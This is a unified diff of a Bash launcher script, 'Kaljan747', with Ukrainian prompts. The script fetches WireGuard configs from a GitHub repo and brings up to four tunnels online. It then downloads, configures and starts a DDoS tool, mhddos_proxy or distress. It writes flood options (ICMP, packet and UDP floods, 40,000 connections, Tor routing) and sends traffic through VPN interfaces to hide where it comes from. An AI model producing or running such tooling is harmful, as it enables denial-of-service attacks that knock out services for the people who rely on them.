@@ -1,221 +1,161 @@
 #!/bin/bash
 set -e
 
-# === Кольоровий вивід ===
+# === Кольори ===
 print_header() {
     echo -e "\e[1;36m========================================"
-    echo -e "🚀  Запуск Kaljan747"
+    echo -e "🚀  Kaljan747 — Повний запуск"
     echo -e "========================================\e[0m"
-}
-
-print_summary() {
-    echo -e "\n\e[1;33m----------------------------------------"
-    echo -e "📦  Залежності: \e[1;32mOK\e[0m"
-    echo -e "🌍  WG-конфіги: \e[1;32mOK\e[0m"
-    echo -e "⚙️  PID: $1"
-    echo -e "----------------------------------------\e[0m"
 }
 
 print_stage() {
     echo -e "\e[1;34m$1\e[0m"
 }
 
-SETTINGS_FILE="$HOME/.kaljan747_settings"
-LOG_DIR="$HOME/logs"
-LOG_FILE="$LOG_DIR/wg.log"
-MODULE_DIR="$HOME/modules"
+print_summary() {
+    echo -e "\n\e[1;33m----------------------------------------"
+    echo -e "📦  Залежності: \e[1;32mOK\e[0m"
+    echo -e "🌍  WG-тунелі: \e[1;32mOK\e[0m"
+    echo -e "⚙️  Модуль: $1 | PID: $2"
+    echo -e "----------------------------------------\e[0m"
+}
+
+# === Шляхи ===
+WG_REPO_RAW="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
+WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
 WG_DIR="$HOME/wg_confs"
-mkdir -p "$LOG_DIR" "$MODULE_DIR" "$WG_DIR"
+LOG_DIR="$HOME/logs"
+MODULE_DIR="$HOME/modules"
+SETTINGS_FILE="$HOME/.kaljan747_settings"
+LOG_FILE="$LOG_DIR/wg.log"
+
+mkdir -p "$WG_DIR" "$LOG_DIR" "$MODULE_DIR"
 touch "$LOG_FILE"
 
-set_permissions() {
-    echo -e "\n📁  Права доступу..."
-    sudo chmod -R 755 "$MODULE_DIR" "$WG_DIR" "$LOG_DIR"
-    sudo chown -R "$USER:$USER" "$MODULE_DIR" "$WG_DIR" "$LOG_DIR"
-    sudo chmod +x "$MODULE_DIR/mhddos_proxy" "$MODULE_DIR/distress" 2>/dev/null || true
-    sudo chmod 644 "$MODULE_DIR"/*.ini "$LOG_FILE" 2>/dev/null || true
-    echo -e "✅ Права доступу встановлено."
-}
+SUDO=$(command -v sudo || echo "")
 
+# === USER-ID ===
 ask_user_id() {
-    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null; then
-        USER_ID=$(zenity --entry --title="USER-ID" --text="Введіть ваш user-id:" --width=400)
-    else
-        read -p "Введіть ваш user-id: " USER_ID
-    fi
+    read -p "Введіть ваш USER-ID (тільки цифри): " USER_ID
+    [[ "$USER_ID" =~ ^[0-9]+$ ]] || { echo "❌ USER-ID недійсний"; exit 1; }
 }
 
-ask_run_parameters() {
-    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null; then
-        USER_SELECTION=$(zenity --forms --title="Kaljan747" \
-            --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
-            --add-combo="Редагувати INI?" --combo-values="Так|Ні" \
-            --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
-            --width=400)
-        [ -z "$USER_SELECTION" ] && { echo "❌ Скасовано"; exit 1; }
-        IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
-    else
-        echo "1) mhddos_proxy | 2) distress"
-        read -p "Ваш вибір (1/2): " mod_choice
-        SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )
+# === Вибір модуля ===
+ask_parameters() {
+    echo "Виберіть модуль:"
+    echo "1) mhddos_proxy"
+    echo "2) distress"
+    read -p "Ваш вибір (1/2): " mod_choice
+    MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )
 
-        echo "1) Так | 2) Ні"
-        read -p "Редагувати INI (1/2): " edit_choice
-        EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )
+    echo "Редагувати INI перед запуском?"
+    echo "1) Так"
+    echo "2) Ні"
+    read -p "Ваш вибір (1/2): " edit_choice
+    EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )
 
-        echo "1) screen у фоні | 2) screen відкрито | 3) без screen"
-        read -p "Режим запуску (1/2/3): " run_choice
-        case "$run_choice" in
-            1) SELECTED_RUN_MODE="screen у фоні";;
-            2) SELECTED_RUN_MODE="screen відкрито";;
-            3) SELECTED_RUN_MODE="без screen";;
-        esac
-    fi
+    echo "Режим запуску:"
+    echo "1) screen у фоні"
+    echo "2) screen відкрито"
+    echo "3) без screen"
+    read -p "Ваш вибір (1/2/3): " run_choice
+    case "$run_choice" in
+        1) RUN_MODE="screen у фоні";;
+        2) RUN_MODE="screen відкрито";;
+        3) RUN_MODE="без screen";;
+    esac
 }
-
-# === Зчитування конфігу ===
-[ -f "$SETTINGS_FILE" ] && source "$SETTINGS_FILE"
-
-if [ -z "$USER_ID" ]; then
-    while true; do
-        ask_user_id
-        [[ "$USER_ID" =~ ^[0-9]+$ ]] && break
-        echo "USER-ID має містити лише цифри!"
-    done
-fi
-
-if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then
-    ask_run_parameters
-fi
 
 print_header
-echo -e "📥  USER-ID: \e[1;32m$USER_ID\e[0m"
-echo -e "🧩  Модуль: \e[1;36m$SELECTED_MODULE\e[0m"
-echo -e "🛠️  Режим: \e[1;36m$SELECTED_RUN_MODE\e[0m"
 
-set_permissions
+# === Завантаження WG-конфігів ===
+print_stage "🌍 Завантаження WG-конфігів з GitHub"
+rm -f "$WG_DIR"/*.conf
 
-# === Пошук wg_confs ===
-if [ ! -d "$WG_DIR" ]; then
-    WG_DIRS=($(find "$HOME" -type d -name "wg_confs"))
-    [ ${#WG_DIRS[@]} -eq 0 ] && WG_DIRS=($(find / -type d -name "wg_confs" 2>/dev/null))
-    [ ${#WG_DIRS[@]} -eq 0 ] && { echo "❌ Папку wg_confs не знайдено"; exit 1; }
+ALL_CONF_URLS=$(curl -s "$WG_REPO_HTML" | grep -oP 'href="\K/k7771/Kaljan747/blob/k7771/wg/[^"?]*\.conf' | sed 's|^|https://raw.githubusercontent.com|;s|/blob|/|')
 
-    if [ ${#WG_DIRS[@]} -gt 1 ]; then
-        for i in "${!WG_DIRS[@]}"; do echo "$((i+1))) ${WG_DIRS[$i]}"; done
-        read -p "Номер потрібної: " SELECTED_INDEX
-        WG_DIR="${WG_DIRS[$((SELECTED_INDEX-1))]}"
-    else
-        WG_DIR="${WG_DIRS[0]}"
-    fi
-
-    sed -i '/^WG_DIR=/d' "$SETTINGS_FILE"
-    echo "WG_DIR=\"$WG_DIR\"" >> "$SETTINGS_FILE"
-fi
-
-echo -e "📡  Папка WG: \e[1;36m$WG_DIR\e[0m"
-
-# === Права root/sudo ===
-[ "$(id -u)" -eq 0 ] && SUDO="" || SUDO="sudo"
-
-# === Залежності ===
-if command -v apt >/dev/null; then
-    $SUDO apt update -y
-    $SUDO apt install -y curl wget git screen sed wireguard zenity
-else
-    echo "❌ apt не знайдено"; exit 1
-fi
-
-print_stage "📦 Залежності встановлено"
-
-# === Завантаження модуля ===
-case "$SELECTED_MODULE" in
-    mhddos_proxy)
-        MODULE="$MODULE_DIR/mhddos_proxy"
-        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
-        LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
-        ;;
-    distress)
-        MODULE="$MODULE_DIR/distress"
-        CONFIG_FILE="$MODULE_DIR/distress.ini"
-        LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
-        ;;
-esac
-
-[ -f "$MODULE" ] || wget -qO "$MODULE" "$LINK"
-chmod +x "$MODULE"
-
-# === Зупинка WG ===
-for iface in $(wg show interfaces 2>/dev/null); do
-    $SUDO wg-quick down "$iface" 2>/dev/null || true
-    $SUDO ip link delete "$iface" 2>/dev/null || true
+for url in $ALL_CONF_URLS; do
+  filename=$(basename "$url")
+  dest="$WG_DIR/$filename"
+  curl -fsSL "$url" -o "$dest" && echo "[+] $filename" || echo "[-] $filename"
+  chmod 600 "$dest"
 done
 
-# === Підключення тунелів ===
+# === Зупинка активних WG ===
+print_stage "🔻 Зупинка активних WG"
+for iface in $(wg show interfaces 2>/dev/null); do
+  echo "[-] Зупиняю: $iface" | tee -a "$LOG_FILE"
+  $SUDO wg-quick down "$iface" 2>/dev/null || true
+  $SUDO ip link delete "$iface" 2>/dev/null || true
+done
+
+# === Підняття до 4-х працюючих WG ===
 check_wg_connection() {
-    curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null
+  curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null
 }
 
-WG_FILES=($(find "$WG_DIR" -name "*.conf" | shuf))
+WG_FILES=( $(find "$WG_DIR" -type f -name "*.conf" | shuf) )
 WG_IFACES=()
 INDEX=0
 
+print_stage "📡 Підключення WG..."
 while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
-    conf="${WG_FILES[$INDEX]}"
-    IFACE=$(basename "$conf" .conf)
-    $SUDO wg-quick up "$conf" || true
-    sleep 2
-    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
+  conf="${WG_FILES[$INDEX]}"
+  IFACE_NAME=$(basename "$conf" .conf)
+  $SUDO wg-quick up "$conf" 2>/dev/null || true
+  sleep 2
 
-    if check_wg_connection "$IFACE"; then
-        STATS=$(wg show "$IFACE" transfer | awk '{print $2, $3, $4}')
-        echo "$TIMESTAMP ✅ $IFACE Працює | TX: $STATS" | tee -a "$LOG_FILE"
-        WG_IFACES+=("$IFACE")
-    else
-        echo "$TIMESTAMP ❌ $IFACE Непрацює | Вимикається" | tee -a "$LOG_FILE"
-        $SUDO wg-quick down "$IFACE" || true
-        $SUDO ip link delete "$IFACE" || true
-    fi
-    INDEX=$((INDEX+1))
+  if check_wg_connection "$IFACE_NAME"; then
+    echo "✅ $IFACE_NAME" | tee -a "$LOG_FILE"
+    WG_IFACES+=("$IFACE_NAME")
+  else
+    echo "❌ $IFACE_NAME" | tee -a "$LOG_FILE"
+    $SUDO wg-quick down "$IFACE_NAME" 2>/dev/null || true
+    $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
+  fi
+  INDEX=$((INDEX+1))
 done
 
-# === Перевірка інтерфейсів ===
-echo "[DEBUG] WG_IFACES: ${WG_IFACES[*]}"
-if [ "${#WG_IFACES[@]}" -eq 0 ]; then
-    echo "❌ Жоден WG інтерфейс не активний"
-    exit 1
-fi
+[ "${#WG_IFACES[@]}" -eq 0 ] && { echo "❌ Жоден тунель не працює"; exit 1; }
 
 VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
 VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
+echo "[✓] Активні інтерфейси: $VPN_LIST"
 
-# === INI формування ===
-echo "[DEBUG] VPN_LIST=$VPN_LIST"
-echo "[DEBUG] VPN_LIST_COMMAS=$VPN_LIST_COMMAS"
+# === USER ID + Параметри ===
+ask_user_id
+ask_parameters
 
-echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
-echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"
-
-# === Редагування ===
-if [ "$EDIT_INI" = "Так" ]; then
-    if [ -n "$DISPLAY" ]; then
-        TMP=$(mktemp)
-        zenity --text-info --editable --filename="$CONFIG_FILE" > "$TMP"
-        mv "$TMP" "$CONFIG_FILE"
-    else
-        nano "$CONFIG_FILE"
-    fi
+# === Завантаження модуля та генерація INI ===
+print_stage "⬇️ Завантаження модуля $MODULE"
+if [ "$MODULE" = "mhddos_proxy" ]; then
+  MODULE_BIN="$MODULE_DIR/mhddos_proxy"
+  CONFIG_FILE="$MODULE_DIR/mhddos.ini"
+  LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
+  echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$CONFIG_FILE"
+else
+  MODULE_BIN="$MODULE_DIR/distress"
+  CONFIG_FILE="$MODULE_DIR/distress.ini"
+  LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
+  echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$CONFIG_FILE"
 fi
 
-# === Запуск ===
-echo -e "⚙️  Запуск модуля..."
-ARGS=$(cat "$CONFIG_FILE")
-case "$SELECTED_RUN_MODE" in
-    "screen у фоні")   screen -dmS "$SELECTED_MODULE" bash -c "$MODULE $ARGS";;
-    "screen відкрито") screen -S "$SELECTED_MODULE" bash -c "$MODULE $ARGS";;
-    "без screen")      bash -c "$MODULE $ARGS" & ;;
-esac
+[ -f "$MODULE_BIN" ] || curl -fsSL "$LINK" -o "$MODULE_BIN"
+chmod +x "$MODULE_BIN"
 
-PID=$(pgrep -f "$MODULE")
-print_summary "$PID"
-exit 0
+# === Редагування INI ===
+[ "$EDIT_INI" = "Так" ] && nano "$CONFIG_FILE"
+
+# === Запуск ===
+print_stage "🚀 Запуск модуля..."
+ARGS=$(cat "$CONFIG_FILE")
+if [ "$RUN_MODE" = "screen у фоні" ]; then
+  screen -dmS "$MODULE" bash -c "$MODULE_BIN $ARGS"
+elif [ "$RUN_MODE" = "screen відкрито" ]; then
+  screen -S "$MODULE" bash -c "$MODULE_BIN $ARGS"
+else
+  bash -c "$MODULE_BIN $ARGS" &
+fi
+
+PID=$(pgrep -f "$MODULE_BIN")
+print_summary "$MODULE" "$PID"
